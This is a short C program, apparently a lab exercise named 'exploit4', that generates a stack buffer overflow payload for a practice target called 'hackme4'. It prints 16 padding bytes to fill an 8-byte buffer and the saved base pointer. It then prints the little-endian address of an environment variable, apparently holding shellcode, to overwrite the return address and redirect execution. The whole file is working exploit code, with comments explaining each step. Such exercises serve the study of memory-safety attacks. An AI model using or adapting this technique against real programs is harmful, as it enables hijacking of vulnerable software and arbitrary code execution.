#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

//function to turn string with hex representations into actual hex
//source: https://stackoverflow.com/questions/6933039/convert-two-ascii-hexadecimal-characters-two-ascii-bytes-in-one-byte/6933094#6933094
uint8_t*
hex_decode(const char *in, size_t len,uint8_t *out)
{
        unsigned int i, t, hn, ln;
        for (t = 0,i = 0; i < len; i+=2,++t) {
                hn = in[i] > '9' ? in[i] - 'A' + 10 : in[i] - '0';
                ln = in[i+1] > '9' ? in[i+1] - 'A' + 10 : in[i+1] - '0';
                out[t] = (hn << 4 ) | ln;
        }
        return out;
}


int main(int argc, char *argv[])
{  

  //get the position of the environment variable passed as an argument on the stack
  void *add = getenv(argv[1])+2; //+2 because the name of the function itself is also on the stack. The name "exploit4" differs in length from the name "hackme4", which this offset corrects

  //put the address in a string
  char strAddress[] = "000000000000";
  sprintf(strAddress, "%p", add);

  //first, print 8 byte for the buf variable, and 8 byte to overwrite the RBP
  int i = 0;
	for (i = 0; i < 16; i++)
	{
		printf("\x41");
	}
  
  //then we take the address of the environment variable and transform it into a hexadecimal output
  char hex[] = "000000000000";
  int y = 0;
  for (int x = 12; x > 0; x=x-2){
    hex[y]=(unsigned char)strAddress[x];
    hex[y+1]=(unsigned char)strAddress[x+1];    
    y = y+2;

  }
  uint8_t res[14];
  hex_decode(hex,strlen(hex),res);
  
  //and this is also printed to be fed into the hackme4 program
  printf("%s",res);  
  return 0;
}



